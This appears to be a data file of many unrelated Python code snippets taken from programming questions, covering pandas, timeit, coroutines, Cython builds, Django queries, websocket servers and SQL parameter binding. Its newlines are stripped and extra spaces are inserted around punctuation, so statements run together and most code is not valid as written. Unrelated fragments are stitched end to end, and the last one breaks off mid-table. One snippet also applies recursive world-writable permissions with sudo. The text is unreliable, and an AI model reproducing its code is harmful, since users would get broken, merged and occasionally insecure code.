: 238 usec per loop $ python -m timeit -s 'result = 0 ' ' x = 2 ' 'result += x**19937 ' 'str ( result ) '100 loops , best of 3 : 16.6 msec per loop"
nosetests -- with-doctestRan 0 tests in 0.001sOK sudo chmod 644 * -Rnosetests -- with-doctestRan 11 test in 0.004sFAILED ( errors=1 ) sudo chmod 777 * -Rnosetests -- with-doctestRan 0 tests in 0.001sOK
# Objects shared by threads : obj = Nonelock_for_obj = threading.Lock ( ) def get_obj ( ) : `` '' '' Function called concurrently by threads . '' '' '' if obj is None : with lock_for_obj : if obj is None : obj = factory ( ) # Never returns ` None ` return obj
"re.findall ( `` [ a-zA-Z ] + ( ? ! \ ( ) '' , `` movav ( x/2 , 2 ) *movsum ( y , 3 ) *z '' ) [ ' x ' , ' y ' , ' z ' ] [ 'mova ' , ' x ' , 'movsu ' , ' y ' , ' z ' ]"
"class wrap ( object ) : def __init__ ( self ) : self._data = range ( 10 ) def __getitem__ ( self , key ) : return self._data.__getitem__ ( key ) w = wrap ( ) print w [ 2 ] # yields `` 2 '' class wrap ( object ) : def __init__ ( self ) : self._data = range ( 10 ) self.__getitem__ = self._data.__getitem__"
ID Date Element Data_Value0 USW00094889 2014-11-12 TMAX 221 USC00208972 2009-04-29 TMIN 562 USC00200032 2008-05-26 TMAX 2783 USC00205563 2005-11-11 TMAX 1394 USC00200230 2014-02-27 TMAX -106 df = df [ ~ ( ( df.Date.month == 2 ) & ( df.Date.day == 29 ) ) ] 'Series ' object has no attribute 'month '
"THIS = \ [ 'logging ' , [ 'logging ' , 'loggers ' , [ 'logging ' , 'loggers ' , 'MYAPP ' , [ 'logging ' , 'loggers ' , 'MYAPP ' , '-handlers ' ] , [ 'logging ' , 'loggers ' , 'MYAPP ' , 'propagate ' ] ] ] , [ 'logging ' , 'version ' ] ] THAT = [ [ 'logging ' ] , [ 'logging ' , 'version ' ] , [ 'logging ' , 'loggers ' ] , [ 'logging ' , 'loggers ' , 'MYAPP ' ] , [ 'logging ' , 'loggers ' , 'MYAPP ' , '-handlers ' ] , [ 'logging ' , 'loggers ' , 'MYAPP ' , 'propagate ' ] ]"
"from functools import wrapsdef coroutine ( func ) : @ wraps ( func ) def decorated ( *args , **kwargs ) : f = func ( *args , **kwargs ) next ( f ) f.send ( f ) return f return decorated @ coroutinedef A ( ) : self = yield # do stuff ... class coroutine ( object ) : `` '' '' Decorator class for coroutines with a self parameter . '' '' '' def __new__ ( cls , func ) : @ wraps ( func ) def decorated ( *args , **kwargs ) : o = object.__new__ ( cls ) o.__init__ ( func , args , kwargs ) return o return decorated def __init__ ( self , generator , args , kw ) : self.generator = generator ( self , *args , **kw ) next ( self.generator ) def __iter__ ( self ) : return self def __next__ ( self ) : return next ( self.generator ) next = __next__ def send ( self , value ) : return self.generator.send ( value ) # Usage : @ coroutinedef A ( self ) : while True : message = yield print self is messagea = A ( ) b = A ( ) a.send ( a ) # outputs Truea.send ( b ) # outputs False"
"from distutils.core import setupfrom distutils.extension import Extensionfrom Cython.Build import cythonizeextensions = [ Extension ( `` foo.bar '' , [ `` foo/bar.pyx '' ] , language= '' c++ '' , extra_compile_args= [ `` -std=c++11 '' ] , extra_link_args= [ `` -std=c++11 '' ] ) ] setup ( name= '' system2 '' , ext_modules=cythonize ( extensions , compiler_directives= { 'language_level ' : `` 3 '' } ) , ) cpdef say_hello ( ) : print ( 'Hello ! ' ) import pyximportpyximport.install ( reload_support=True ) import foo.barimport subprocessfrom importlib import reloadif __name__ == '__main__ ' : def reload_bar ( ) : p = subprocess.Popen ( 'python setup.py build_ext -- inplace ' , shell=True , cwd= ' < your directory > ' ) p.wait ( ) reload ( foo.bar ) foo.bar.say_hello ( )"
"Pos . :123456789012345Name . : ABCDEFGHIJKLMNO Str . : SOMESTRINGSOMET < -- -- indented by half a row , Column number superscriptedStr . : SOM SOMETStr . : SOMESTRIN ET"
"data = [ 'ABC ' , 'EFG ' , 'IJK ' , 'MNO ' ] [ ( ' A ' , ' E ' , ' I ' , 'M ' ) , ( ' B ' , ' F ' , ' J ' , ' N ' ) , ( ' C ' , ' G ' , ' K ' , ' O ' ) ] [ [ ' A ' , ' B ' , ' C ' ] , [ ' E ' , ' F ' , ' G ' ] , [ ' I ' , ' J ' , ' K ' ] , [ 'M ' , ' N ' , ' O ' ] ] [ ( [ ' A ' , ' B ' , ' C ' ] , ) , ( [ ' E ' , ' F ' , ' G ' ] , ) , ( [ ' I ' , ' J ' , ' K ' ] , ) , ( [ 'M ' , ' N ' , ' O ' ] , ) ]"
> > > def f ( ) : if a : print `` > > > from dis import dis > > > dis ( f ) 2 0 LOAD_GLOBAL 0 ( a ) 3 JUMP_IF_FALSE 9 ( to 15 ) 6 POP_TOP 3 7 LOAD_CONST 1 ( `` ) 10 PRINT_ITEM 11 PRINT_NEWLINE 12 JUMP_FORWARD 1 ( to 16 ) > > 15 POP_TOP > > 16 LOAD_CONST 0 ( None ) 19 RETURN_VALUE > > > def f1 ( ) : if a : if b : print `` > > > dis ( f1 ) 2 0 LOAD_GLOBAL 0 ( a ) 3 JUMP_IF_FALSE 20 ( to 26 ) 6 POP_TOP 3 7 LOAD_GLOBAL 1 ( b ) 10 JUMP_IF_FALSE 9 ( to 22 ) 13 POP_TOP 4 14 LOAD_CONST 1 ( `` ) 17 PRINT_ITEM 18 PRINT_NEWLINE 19 JUMP_ABSOLUTE 27 > > 22 POP_TOP 23 JUMP_FORWARD 1 ( to 27 ) > > 26 POP_TOP > > 27 LOAD_CONST 0 ( None ) 30 RETURN_VALUE 121 228 LOAD_FAST 11 ( a ) 231 LOAD_CONST 9 ( 100 ) 234 COMPARE_OP 0 ( < ) 237 JUMP_IF_FALSE 23 ( to 263 ) 240 POP_TOP 241 LOAD_FAST 11 ( b ) 244 LOAD_CONST 11 ( 10 ) 247 COMPARE_OP 4 ( > ) 250 JUMP_IF_FALSE 10 ( to 263 ) 253 POP_TOP 122 254 LOAD_CONST 3 ( 1 ) 257 STORE_FAST 4 ( ok ) 260 JUMP_ABSOLUTE 27 > > 263 POP_TOP if a < 100 and b > 10 : ok=1 106 24 SETUP_LOOP 297 ( to 324 ) > > 27 LOAD_FAST 4 ( ok ) 30 LOAD_CONST 1 ( 0 ) 33 COMPARE_OP 2 ( == ) 36 JUMP_IF_FALSE 283 ( to 322 ) 39 POP_TOP 115 170 LOAD_FAST 3 ( q ) 173 LOAD_CONST 10 ( 1 ) 176 COMPARE_OP 0 ( < ) 179 JUMP_IF_FALSE 45 ( to 227 ) 182 POP_TOP 183 LOAD_FAST 11 ( z ) 186 LOAD_CONST 11 ( 10 ) 189 COMPARE_OP 4 ( > ) 192 JUMP_IF_FALSE 32 ( to 227 ) 195 POP_TOP 116 196 LOAD_CONST 1 ( 0 ) 199 STORE_FAST 4 ( ok ) 117 202 LOAD_FAST 5 ( u ) 205 LOAD_CONST 3 ( 1 ) 208 BINARY_ADD 209 STORE_FAST 5 ( u ) 118 212 LOAD_CONST 1 ( 0 ) 215 STORE_FAST 3 ( k ) 119 218 LOAD_CONST 3 ( 10 ) 221 STORE_FAST 6 ( dv ) 224 JUMP_ABSOLUTE 27 > > 227 POP_TOP
"public enum Color { RED , BLUE ; } class Color ( Enum ) { RED = `` red '' # or e.g 1 BLUE = `` blue '' # or e.g . 2 }"
"class SillyWalk ( object ) : @ staticmethod def is_silly_enough ( walk ) : return ( False , `` It 's never silly enough '' ) def walk ( self , appraisal_method=is_silly_enough ) : self.do_stuff ( ) ( was_good_enough , reason ) = appraisal_method ( self ) if not was_good_enough : self.execute_self_modifying_code ( reason ) return appraisal_method def do_stuff ( self ) : pass def execute_self_modifying_code ( self , problem ) : from __future__ import deepjuju deepjuju.kiss_booboo_better ( self , problem ) > > > silly_walk = SillyWalk ( ) > > > appraise = walk ( ) > > > is_good_walk = appraise ( silly_walk )"
"Here vec is 2-d list of float values of shape ( 10 , ) Ex : [ [ 0.80000000000000004 , 0.69999999999999996 , 0.59999999999999998 , 0.44444444444444448 , 0.25 , 0.0 , 0.5 , 2.0 , 0 , 2.9999999999999996 ] [ 2.25 , 2.666666666666667 , 3.4999999999999996 , 0 , 2.5 , 1.0 , 0.5 , 0.37499999999999994 , 0.20000000000000001 , 0.10000000000000001 ] [ 2.25 , 2.666666666666667 , 3.4999999999999996 , 0 , 2.5 , 1.0 , 0.5 , 0.37499999999999994 , 0.20000000000000001 , 0.10000000000000001 ] [ 2.25 , 2.666666666666667 , 3.4999999999999996 , 0 , 2.5 , 1.0 , 0.5 , 0.37499999999999994 , 0.20000000000000001 , 0.10000000000000001 ] ] vec1 = extractFeature ( img1 ) vec2 = extractFeature ( img2 ) q1 = np.asarray ( vec1 , dtype=np.float32 ) q2 = np.asarray ( vec2 , dtype=np.float32 ) FLANN_INDEX_KDTREE = 0index_params = dict ( algorithm = FLANN_INDEX_KDTREE , trees = 5 ) search_params = dict ( checks=50 ) # or pass empty dictionaryflann = cv2.FlannBasedMatcher ( index_params , search_params ) matches = flann.knnMatch ( q1 , q2 , k=2 ) [ [ [ 0.80000000000000004 , 0.69999999999999996 , 0.59999999999999998 , 0.44444444444444448 , 0.25 , 0.0 , 0.5 , 2.0 , 0 , 2.9999999999999996 ] , [ 2.06471330e-01 , 1.59191645e-02 , 9.17678759e-05 , 1.32570314e-05 , 4.58424252e-10 , 1.66717250e-06,6.04810165e-11 ] [ [ 2.25 , 2.666666666666667 , 3.4999999999999996 , 0 , 2.5 , 1.0 , 0.5 , 0.37499999999999994 , 0.20000000000000001 , 0.10000000000000001 ] , [ 2.06471330e-01 , 1.59191645e-02 , 9.17678759e-05 , 1.32570314e-05 , 4.58424252e-10 , 1.66717250e-06 , 6.04810165e-11 ] , [ [ 2.25 , 2.666666666666667 , 3.4999999999999996 , 0 , 2.5 , 1.0 , 0.5 , 0.37499999999999994 , 0.20000000000000001 , 0.10000000000000001 ] , [ 2.06471330e-01 , 1.59191645e-02 , 9.17678759e-05 , 1.32570314e-05 , 4.58424252e-10 , 1.66717250e-06 , 6.04810165e-11 ] , [ [ 2.25 , 2.666666666666667 , 3.4999999999999996 , 0 , 2.5 , 1.0 , 0.5 , 0.37499999999999994 , 0.20000000000000001 , 0.10000000000000001 ] , [ 2.06471330e-01 , 1.59191645e-02 , 9.17678759e-05 , 1.32570314e-05 , 4.58424252e-10 , 1.66717250e-06 , 6.04810165e-11 ] ] q1 = np.asarray ( vec1 , dtype=np.float32 )"
d_false = defaultdict ( bool ) d_true = defaultdict ( lambda : True )
[ part ] attribute = $ { variable } [ server-xml ] recipe = collective.recipe.templateinput = templates/server.xml.inoutput = $ { product : build-directory } /conf/server.xmldollar = $ $ { dollar } { variable } $ { variable } \ $ { variable } $ $ { variable }
"A = 314if A == A == A : print ( 'True # 1 ' ) if A == A == 271 : print ( 'True # 2 ' ) lie = 0if lie is lie is lie : print ( 'no matter how white , how small , ' ) print ( 'how incorporating of a smidgeon ' ) print ( 'of truth there be in it . ' ) True # 1no matter how white , how small , how incorporating of a smidgeonof truth there be in it ."
"Traceback ( most recent call last ) : File `` ./lmd3-mkhead.py '' , line 71 , in < module > main ( ) File `` ./lmd3-mkhead.py '' , line 66 , in main create ( ) File `` ./lmd3-mkhead.py '' , line 41 , in create headver1 [ depotFile ] =revTypeError : Data values must be of type string or None . Traceback ( most recent call last ) : File `` ./lmd3-mkhead.py '' , line 71 , in < module > main ( ) File `` ./lmd3-mkhead.py '' , line 66 , in main create ( ) File `` ./lmd3-mkhead.py '' , line 41 , in create headver1 [ depotFile ] =rev File `` /usr/anim/modsquad/oses/fc11/lib/python2.6/bsddb/__init__.py '' , line 276 , in __setitem__ _DeadlockWrap ( wrapF ) # self.db [ key ] = value File `` /usr/anim/modsquad/oses/fc11/lib/python2.6/bsddb/dbutils.py '' , line 68 , in DeadlockWrap return function ( *_args , **_kwargs ) File `` /usr/anim/modsquad/oses/fc11/lib/python2.6/bsddb/__init__.py '' , line 275 , in wrapF self.db [ key ] = valueTypeError : Data values must be of type string or None ."
"import numpy as npimport matplotlib.pylab as pltdata = [ np.random.rand ( 100 ) + 10 * i for i in range ( 3 ) ] ax1 = plt.subplot ( 111 ) n , bins , patches = ax1.hist ( data , 20 , histtype='bar ' , color= [ ' 0 ' , ' 0.33 ' , ' 0.66 ' ] , label= [ 'normal I ' , 'normal II ' , 'normal III ' ] , hatch= [ `` , ' o ' , '/ ' ] )"
"import stringfrom itertools import producttext = string.lowercase [ : ] + string.uppercase [ : ] + '0123456789'items = product ( text , repeat=5 ) for item in items : # do something items = list ( product ( text , repeat=5 ) ) [ 300000:600000+1 ] for item in items : # do something"
"{ 'function_name ' : { 'uses ' : [ ... functions used in this function ... ] , 'causes ' : [ ... functions that use this function ... ] } , ... } import packageimport inspectimport typesfor name , obj in vars ( package ) .items ( ) : if isinstance ( obj , types.FunctionType ) : module , *_ = inspect.getmodule ( obj ) .__name__.split ( ' . ' ) if module == package.__name__ : # Now that function is obtained need to find usages or functions used within it"
"import numpy as npx_axis_rotations = np.radians ( [ 0,10,32,44,165 ] ) matrices = [ ] for angle in x_axis_rotations : matrices.append ( np.asarray ( [ [ 1 , 0 , 0 ] , [ 0 , np.cos ( angle ) , -np.sin ( angle ) ] , [ 0 , np.sin ( angle ) , np.cos ( angle ) ] ] ) ) matrices = np.array ( matrices )"
import pandas.rpy.common as cominfert = com.load_data ( 'infert ' ) print ( infert.head ( ) ) In [ 67 ] : com.load_data ( 'Titanic ' ) Can not handle dim=4
"MAKE_CHOICES = [ ( 'honda ' , 'Honda ' ) , ... ] class Dealer ( models.Model ) : make_list = TextArrayField ( choices=MAKE_CHOICES ) class Vehicle ( models.Model ) : dealer = models.ForeignKey ( Dealer , null=True , blank=True ) make = models.CharField ( max_length=255 , choices=MAKE_CHOICES , blank=True ) from django.db.models import functionsclass SelectUnnest ( functions.Func ) : function = 'SELECT UNNEST ' ... Vehicle.objects.filter ( make__in=SelectUnnest ( 'dealer__make_list ' ) ) .count ( ) SELECT COUNT ( * ) AS `` __count '' FROM `` myapp_vehicle '' INNER JOIN `` myapp_dealer '' ON ( `` myapp_vehicle '' . `` dealer_id '' = `` myapp_dealer '' . `` id '' ) WHERE `` myapp_vehicle '' . `` make '' IN ( SELECT UNNEST ( `` myapp_dealer '' . `` make_list '' ) ) class Any ( functions.Func ) : function = 'ANY ' ... Vehicle.objects.filter ( make=Any ( 'dealer__make_list ' ) ) .count ( ) SELECT COUNT ( * ) AS `` __count '' FROM `` myapp_vehicle '' INNER JOIN `` myapp_dealer '' ON ( `` myapp_vehicle '' . `` dealer_id '' = `` myapp_dealer '' . `` id '' ) WHERE `` myapp_vehicle '' . `` make '' = ( ANY ( `` myapp_dealer '' . `` make_list '' ) ) = # select id , make from appname_tablename limit 3 ; id | make -- -+ -- -- -- -- -- -- -- -- -- -- -- 58 | { vw } 76 | { lexus , scion , toyota } 39 | { chevrolet }"
"connection = TCP4ClientEndPoint ( reactor , server_host , server_port ) factory = Factory ( ) factory.protocol = Protocolprotocol = yield connection.connect ( factory ) protocol.doSomething ( ) # returns a deferred if protocol.isConnected ( ) : doSomethingElse ( )"
"df = pd.DataFrame ( np.randn ( 10000,1 ) , columns = [ 'rand ' ] ) sum_abs = df.rolling ( 5 ) .sum ( ) df2 = pd.DataFrame ( pd.Series ( [ 1,2,3,4,5 ] ) , name ='weight ' ) ) df3 = df.mul ( df2.set_index ( df.index ) ) .rolling ( 5 ) .sum ( )"
user @ host > rst2html.py README.rst > /tmp/foo.htmlREADME.rst:18 : ( WARNING/2 ) Inline emphasis start-string without end-string.README.rst:18 : ( WARNING/2 ) Inline emphasis start-string without end-string .
del lst [ len ( lst ) -n : ]
"df [ df.apply ( lambda r : r.str.contains ( ' b ' , case=False ) .any ( ) , axis=1 ) ]"
"set : 10 10frozenset : 10 10Set : 10 20myset : 10 20 from sets import Setfrom collections import MutableSetclass hash_counting_int ( int ) : def __init__ ( self , *args ) : self.count = 0 def __hash__ ( self ) : self.count += 1 return int.__hash__ ( self ) class myset ( MutableSet ) : def __init__ ( self , iterable= ( ) ) : # The values of self.dictset matter ! See further notes below . self.dictset = dict ( ( item , i ) for i , item in enumerate ( iterable ) ) def __bomb ( s , *a , **k ) : raise NotImplementedError add = discard = __contains__ = __iter__ = __len__ = __bombdef test_do_not_rehash_dict_keys ( thetype , n=1 ) : d = dict.fromkeys ( hash_counting_int ( k ) for k in xrange ( n ) ) before = sum ( elem.count for elem in d ) s = thetype ( d ) after = sum ( elem.count for elem in d ) return before , afterfor t in set , frozenset , Set , myset : before , after = test_do_not_rehash_dict_keys ( t , 10 ) print ' % s : % d % d ' % ( t.__name__ , before , after )"
python manage.py dumpdata my_app > data.json
"def prime_factor ( n , primes ) : prime_factors = [ ] i = 0 while n ! = 1 : if n % primes [ i ] == 0 : factor = primes [ i ] prime_factors.append ( factor ) n = n // factor else : i += 1 return prime_factorsimport mathdef factors ( n ) : if n == 0 : return [ ] factors = { 1 , n } for i in range ( 2 , math.floor ( n ** ( 1/2 ) ) + 1 ) : if n % i == 0 : factors.add ( i ) factors.add ( n // i ) return list ( factors ) def primes_up_to ( up_to ) : marked = [ 0 ] * up_to value = 3 s = 2 primes = [ 2 ] while value < up_to : if marked [ value ] == 0 : primes.append ( value ) i = value while i < up_to : marked [ i ] = 1 i += value value += 2 return primes"
"df = pd.DataFrame ( { ' x ' : [ 1 , 2,2.01 , 3 , 4,4.1,3.95 , 5 , ] , ' y ' : [ 1 , 2,2.2 , 3 , 4.1,4.4,4.01 , 5.5 ] } ) def cluster_near_values ( df , colname_to_cluster , bin_size=0.1 ) : used_x = [ ] # list of values already grouped group_index = 0 for search_value in df [ colname_to_cluster ] : if search_value in used_x : # value is already in a group , skip to next continue g_ix = df [ abs ( df [ colname_to_cluster ] -search_value ) < bin_size ] .index used_x.extend ( df.loc [ g_ix , colname_to_cluster ] ) df.loc [ g_ix , 'cluster_group ' ] = group_index group_index += 1 return df.groupby ( 'cluster_group ' ) .mean ( ) print ( cluster_near_values ( df , ' x ' , 0.1 ) ) x ycluster_group 0.0 1.000000 1.001.0 2.005000 2.102.0 3.000000 3.003.0 4.016667 4.174.0 5.000000 5.50"
"import sys from BaseHTTPServer import HTTPServerfrom CGIHTTPServer import CGIHTTPRequestHandler server_address= ( `` ,8080 ) httpd = HTTPServer ( server_address , CGIHTTPRequestHandler ) httpd.serve_forever ( )"
"import ctypesfrom ctypes import cdllclass List_4 ( ctypes.Structure ) : _fields_ = [ ( `` array '' , ctypes.ARRAY ( ctypes.c_int32 , 4 ) ) ] rust = cdll.LoadLibrary ( `` target/debug/py_link.dll '' ) rust.function_vec.restype = List_4foobar = rust.function_i32 ( 5 ) barbaz = rust.function_vec ( [ 1 , 2 , 3 , 4 ] ) # Throws error : Do n't know how to convert parameterprint foobarprint barbaz # [ repr ( C ) ] pub struct List_4 { array : [ i32 ; 4 ] } # [ no_mangle ] pub extern fn function_i32 ( number : i32 ) - > i32 { number } # [ no_mangle ] pub extern fn function_vec ( list : List_4 ) - > List_4 { List_4 { array : [ 1 , 2 , 3 , 5 ] } }"
import logginglogging.disable ( logging.CRITICAL ) logging.warning ( `` test '' ) # Something herelogging.warning ( `` test '' )
"factory = MessageServerFactory ( `` ws : //localhost:9000 '' , debug=debug , debugCodePaths=debug ) factory.protocol = MessageServerProtocolfactory.setProtocolOptions ( allowHixie76=True ) listenWS ( factory ) import loggingfrom autobahn.websocket import WebSocketServerFactory , WebSocketServerProtocolfrom DatabaseConnector import DbConnectorfrom LoginManager import LoginManagerfrom MessageTypes import MessageParserclass MessageServerProtocol ( WebSocketServerProtocol ) : def onOpen ( self ) : self.factory.register ( self ) def onMessage ( self , msg , binary ) : if not binary : self.factory.processMessage ( self , msg ) def connectionLost ( self , reason ) : WebSocketServerProtocol.connectionLost ( self , reason ) self.factory.unregister ( self ) class MessageServerFactory ( WebSocketServerFactory ) : logging.basicConfig ( filename='log/dastan.log ' , format= ' % ( levelname ) s : % ( message ) s ' , level=logging.WARNING ) def __init__ ( self , url , debug=False , debugCodePaths=False ) : WebSocketServerFactory.__init__ ( self , url , debug=debug , debugCodePaths=debugCodePaths ) self.clients = { } self.connector = DbConnector ( ) self.messages = MessageParser ( ) self.manager = LoginManager ( ) def register ( self , client ) : print `` % s connected '' % client.peerstrdef unregister ( self , client ) : if self.clients.has_key ( client ) : self.processLogout ( client ) print `` % s disconnected '' % client.peerstrdef processMessage ( self , client , msg ) : try : msg = self.messages.parseMessage ( msg ) action = msg [ 'Type ' ] except ValueError , e : logging.warning ( `` [ Parse ] : % s '' , e.message ) client.sendMessage ( self.messages.createErrorMessage ( `` could not parse your message '' ) ) return if action == `` ChatMessage '' : self.processChatMessage ( client , msg ) # elif action == `` Login '' : # self.processLogin ( client , msg ) # elif action == `` Logout '' : # self.processLogout ( client ) elif action == `` OpenId '' : self.manager.processLogin ( client , msg ) def processChatMessage ( self , client , msg ) : if not self.clients.has_key ( client ) : client.sendMessage ( self.messages.createErrorMessage ( 'Not authorized ' ) ) return if not msg [ 'Message ' ] : client.sendMessage ( self.messages.createErrorMessage ( 'Invalid Message ' ) ) return if not msg [ 'Recipient ' ] : client.sendMessage ( self.messages.createErrorMessage ( 'Invalid Recipient ' ) ) return if msg [ 'Recipient ' ] in self.clients.values ( ) : for c in self.clients : if self.clients [ msg [ 'Recipient ' ] ] : c.sendMessage ( self.messages.chatMessage ( msg [ 'Sender ' ] , msg [ 'Message ' ] ) ) print `` sent message from % s to % s : ' % s ' .. '' % ( msg [ 'Sender ' ] , msg [ 'Recipient ' ] , msg [ 'Message ' ] ) else : client.sendMessage ( self.messages.createErrorMessage ( 'User not registered ' ) ) def checkSender ( self , user , client ) : if user in self.clients.values ( ) and self.clients [ client ] == user : return else : self.clients [ client ] = user var wsuri = `` ws : //192.168.0.12:9000 '' ; if ( `` WebSocket '' in window ) { sock = new WebSocket ( wsuri ) ; } else if ( `` MozWebSocket '' in window ) { sock = new MozWebSocket ( wsuri ) ; } else { log ( `` Browser does not support WebSocket ! `` ) ; window.location = `` http : //autobahn.ws/unsupportedbrowser '' ; } if ( sock ) { sock.onopen = function ( ) { log ( `` Connected to `` + wsuri ) ; } sock.onclose = function ( e ) { log ( `` Connection closed ( wasClean = `` + e.wasClean + `` , code = `` + e.code + `` , reason = ' '' + e.reason + `` ' ) '' ) ; sock = null ; } sock.onmessage = function ( e ) { receive ( e.data ) ; } }"
"data = { `` 2010 '' : { ' A':2 , ' B':3 , ' C':5 , 'D ' : -18 , } , `` 2011 '' : { ' A':1 , ' B':2 , ' C':3 , 'D':1 , } , `` 2012 '' : { ' A':1 , ' B':2 , ' C':4 , 'D':2 } } data = { ' A':4 , ' B':7 , ' C':12 , 'D ' : -15 }"
"import zmq import time def main ( ) : context = zmq.Context ( ) serverSocket = StartServer ( context , '' 9999 '' ) processRequests ( serverSocket ) def processRequests ( socket ) : while True : print `` waiting for request '' msg = socket.recv ( ) print msg time.sleep ( 10 ) socket.send ( `` Request processed '' ) def StartServer ( context , port ) : socket = context.socket ( zmq.REP ) socket.bind ( `` tcp : //* : % s '' % port ) print `` started server on '' , port return socket if __name__ == '__main__ ' : print `` starting IPC server '' main ( )"
"a = [ ' a ' , ' b ' ] b = [ 1 , 2 , 3 ] c = [ `` a_1 b_1 '' , `` a_1 b_2 '' , `` a_1 b_3 '' , `` a_2 b_1 '' , `` a_2 b_2 '' , `` a_2 b_3 '' , `` a_3 b_1 '' , `` a_3 b_2 '' `` a_3 b_3 '' ]"
"serials = [ '0123456 ' , '0123457 ' ] c.execute ( `` 'select * from table where key in % s '' ' , ( serials , ) ) select * from table where key in ( `` '0123456 ' '' , `` '0123457 ' '' ) > > > c.executemany ( `` 'select * from table where key in ( % s ) ' '' , [ ( x , ) for x in serials ] ) 2L > > > c.fetchall ( ) ( ( 1 , '0123457 ' , 'faketestdata ' ) , ) # Assume check above for case where len ( serials ) == 0query = `` 'select * from table where key in ( { 0 } ) ' '' .format ( ' , '.join ( [ `` % s '' ] * len ( serials ) ) ) c.execute ( query , tuple ( serials ) ) # tuple ( ) for case where len == 1"
"# data wranglingxls = pd.ExcelFile ( 'FreewayFDSData.xlsx ' ) # this loads the data only once saving memorydf = pd.read_excel ( xls , 'Volume ' , parse_dates=True , index_col= '' Time '' ) df = df.Tdf2 = pd.read_excel ( xls , 'Occupancy ' , parse_dates=True , index_col= '' Time '' ) df2 = df2.Tdf3 = pd.read_excel ( xls , 'Speed ' , parse_dates=True , index_col= '' Time '' ) df3 = df3.TDetectors = list ( df.columns ) mf = pd.read_excel ( 'FreewayFDSData.xlsx ' , 'Coordinates ' , index_col= '' Short Name '' ) # return df , df2 , df3 , Detectors , mf # input slider value then output into data frame filter for slider time volume value # timeslider arrangementdef heatmap ( SVO ) : # creates heatmap data for map SVO [ 'Period ' ] = np.arange ( len ( SVO ) ) mintime = SVO [ 'Period ' ] .min ( ) maxtime = SVO [ 'Period ' ] .max ( ) return mintime , maxtimemintime , maxtime = heatmap ( df ) hf = df.reset_index ( ) .set_index ( 'Period ' ) df2 [ 'Period ' ] = np.arange ( len ( df2 ) ) hf2 = df2.reset_index ( ) .set_index ( 'Period ' ) df3 [ 'Period ' ] = np.arange ( len ( df3 ) ) hf3 = df.reset_index ( ) .set_index ( 'Period ' ) # Markerdef datatime ( t , hf ) : heat = hf.filter ( items= [ t ] , axis=0 ) .T.drop ( `` index '' ) return heat [ t ] ... .. html.Div ( [ dcc.RadioItems ( id='tdatam ' , options= [ { 'label ' : i , 'value ' : i } for i in [ 'Volume ' , 'Speed ' , 'Occupancy ' ] ] , value='Volume ' , labelStyle= { 'display ' : 'inline-block ' } ) , ] , style= { 'width ' : '48 % ' , 'display ' : 'inline-block ' } ) , html.Div ( [ ... . ] , style= { 'width ' : '50 % ' , 'display ' : 'inline-block ' } ) , dcc.Graph ( id='graph ' ) , html.P ( `` '' , id= '' popupAnnotation '' , className= '' popupAnnotation '' ) , dcc.Slider ( id= '' Slider '' , marks= { i : 'Hour { } '.format ( i ) for i in range ( 0 , 24 ) } , min=mintime / 4 , max=maxtime / 4 , step=.01 , value=9 , ) ] , style= { `` padding-bottom '' : '50px ' , `` padding-right '' : '50px ' , `` padding-left '' : '50px ' , `` padding-top '' : '50px ' } ) , ... . @ app.callback ( Output ( 'graph ' , 'figure ' ) , [ Input ( 'Slider ' , 'value ' ) , Input ( 'tdatam ' , 'value ' ) ] ) def update_map ( time , tdata ) : # use state zoom = 10.0 latInitial = -37.8136 lonInitial = 144.9631 bearing = 0 # when time function is updated from slider it is failing # Trying to create either a new time variable to create a test for time slider or alternatively a new function for updating time if tdata == `` Volume '' : return go.Figure ( data=Data ( [ Scattermapbox ( lat=mf.Y , lon=mf.X , mode='markers ' , hoverinfo= '' text '' , text= [ `` Monash Freeway '' , `` Western Link '' , `` Eastern Link '' , `` Melbourne CBD '' , `` Swan Street '' ] , # opacity=0.5 , marker=Marker ( size=15 , color=datatime ( time , hf ) , colorscale='Viridis ' , opacity=.8 , showscale=True , cmax=2500 , cmin=700 ) , ) , ] ) , layout=Layout ( autosize=True , height=750 , margin=Margin ( l=0 , r=0 , t=0 , b=0 ) , showlegend=False , mapbox=dict ( accesstoken=mapbox_access_token , center=dict ( lat=latInitial , # -37.8136 lon=lonInitial # 144.9631 ) , style='dark ' , bearing=bearing , zoom=zoom ) , ... ... .. ) ] ) ) Lat/Long/NameShort Name Y XA -37.883416 145.090084B -37.883378 145.090038C -37.882968 145.089531D -37.882931 145.089484Data inputRow Labels 00:00 - 00:15 00:15 - 00:30 00:30 - 00:45 00:45 - 01:00 01:00 - 01:15 01:15 - 01:30 01:30 - 01:45 01:45 - 02:00 02:00 - 02:15 02:15 - 02:30 02:30 - 02:45 02:45 - 03:00 03:00 - 03:15 03:15 - 03:30 03:30 - 03:45 03:45 - 04:00 04:00 - 04:15 04:15 - 04:30 04:30 - 04:45 04:45 - 05:00 05:00 - 05:15 05:15 - 05:30 05:30 - 05:45 05:45 - 06:00 06:00 - 06:15 06:15 - 06:30 06:30 - 06:45 06:45 - 07:00 07:00 - 07:15 07:15 - 07:30 07:30 - 07:45 07:45 - 08:00 08:00 - 08:15 08:15 - 08:30 08:30 - 08:45 08:45 - 09:00 09:00 - 09:15 09:15 - 09:30 09:30 - 09:45 09:45 - 10:00 10:00 - 10:15 10:15 - 10:30 10:30 - 10:45 10:45 - 11:00 11:00 - 11:15 11:15 - 11:30 11:30 - 11:45 11:45 - 12:00 12:00 - 12:15 12:15 - 12:30 12:30 - 12:45 12:45 - 13:00 13:00 - 13:15 13:15 - 13:30 13:30 - 13:45 13:45 - 14:00 14:00 - 14:15 14:15 - 14:30 14:30 - 14:45 14:45 - 15:00 15:00 - 15:15 15:15 - 15:30 15:30 - 15:45 15:45 - 16:00 16:00 - 16:15 16:15 - 16:30 16:30 - 16:45 16:45 - 17:00 17:00 - 17:15 17:15 - 17:30 17:30 - 17:45 17:45 - 18:00 18:00 - 18:15 18:15 - 18:30 18:30 - 18:45 18:45 - 19:00 19:00 - 19:15 19:15 - 19:30 19:30 - 19:45 19:45 - 20:00 20:00 - 20:15 20:15 - 20:30 20:30 - 20:45 20:45 - 21:00 21:00 - 21:15 21:15 - 21:30 21:30 - 21:45 21:45 - 22:00 22:00 - 22:15 22:15 - 22:30 22:30 - 22:45 22:45 - 23:00 23:00 - 23:15 23:15 - 23:30 23:30 - 23:45 23:45 - 24:00A 88 116 84 68 76 56 56 48 72 48 76 40 76 44 36 76 76 116 124 176 236 352 440 624 1016 1172 1260 1280 1304 1312 1252 1344 1324 1336 1212 1148 1132 1120 1084 996 924 1040 952 900 900 1116 1136 1044 1144 1152 1224 1088 1132 1184 1208 1120 1240 1196 1116 1264 1196 1240 1308 1192 1164 1096 1080 1160 1112 